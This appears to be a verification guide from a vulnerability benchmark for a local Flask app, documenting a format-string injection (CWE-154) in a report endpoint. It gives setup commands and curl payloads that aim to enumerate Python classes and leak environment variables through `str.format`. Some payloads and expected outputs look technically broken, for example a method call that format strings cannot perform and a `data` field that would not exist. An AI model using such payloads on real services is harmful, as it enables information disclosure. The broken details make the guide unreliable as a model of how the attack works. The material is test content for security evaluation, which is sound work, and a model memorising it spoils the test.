
# Verification Guide: DataYielder Vulnerability

## CWE-154: Improper Neutralization of Variable Name Delimiters

**CWE ID:** CWE-154

**Location:**  
- `generate_report()` function, lines 8-18 in `src/app.py`
- The template string from user input is used directly in `template.format(**data)`, allowing injection of arbitrary field names and variable expansion.

---

### Steps to Trigger the Vulnerability

#### 1. Install Requirements
```bash
cd projects/DataYielder
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

#### 2. Start the Flask App

```bash
cd src
python app.py
```

Flask will listen at `http://127.0.0.1:5007`.

#### 3. Trigger with Benign Input

```bash
curl -s -X POST http://localhost:5007/report \
  -H "Content-Type: application/json" \
  -d '{"template": "Name: {name}, Date: {date}", "data": {"name":"Alice"}}'
```

**Expected output:**
```json
{"result": "Name: Alice, Date: 2024-06-19"}
```

#### 4. Exploit: Disclose Arbitrary Attributes

The bug allows injecting any valid Python field into the format string. For example, access to built-in variables:

```bash
curl -s -X POST http://localhost:5007/report \
  -H "Content-Type: application/json" \
  -d '{"template": "Directory list: {data.__class__.__mro__[1].__subclasses__()}", "data": {"x":1}}'
```

Look for a result including a long list of class representations, such as:
```
{"result":"Directory list: [<class 'object'>, <class 'type'>, ..."}
```

#### 5. Proof with Path Traversal (inspect file content)

You can leak environment variables or open files if format string supports it. Example with environment access:

```bash
curl -s -X POST http://localhost:5007/report \
  -H "Content-Type: application/json" \
  -d '{"template": "Env: {data.__init__.__globals__[os][environ]}", "data": {"x":1}}'
```

If Python `os` module is available, this can expose environment variables. This proves the downstream receives and interprets special delimiters from user-controlled templates.

---

**Summary:**  
The vulnerability exists because variable delimiters (e.g., `{data.__class__.__mro__[1].__subclasses__()}`) are not sanitized from input before usage with `str.format()`, leading to arbitrary attribute access and potential information disclosure.
